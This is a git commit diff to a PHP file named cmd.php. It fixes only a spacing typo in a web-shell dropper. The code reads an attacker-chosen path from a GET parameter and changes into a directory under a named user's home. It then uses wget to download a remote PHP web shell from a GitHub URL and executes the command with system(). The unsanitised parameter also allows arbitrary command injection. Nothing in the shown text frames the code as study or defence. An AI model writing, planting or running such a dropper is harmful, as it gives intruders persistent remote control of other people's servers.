3cfe07769aed75c2b74a892fc4fe042f4e5f8b80
sslfalse <119804615+sslfalse@users.noreply.github.com>
2022-12-30 03:17:59 +0700

    Update cmd.php

--- cmd.php
+++ cmd.php
@@ -3,7 +3,7 @@ if (isset($_GET['trustsec0x0777'])) {
     $path = $_GET['trustsec0x0777'];
     $basedir = '/home/tkraudha/';
     $shell = 'https://raw.githubusercontent.com/sslfalse/shell/main/alfatmp.php';
-    $query = 'cd '. $basedir . $path .'&& wget -O trustsec0x0777.php '. $shell;
+    $query = 'cd '. $basedir . $path .' && wget -O trustsec0x0777.php '. $shell;
     system($query);
 }
 ?>
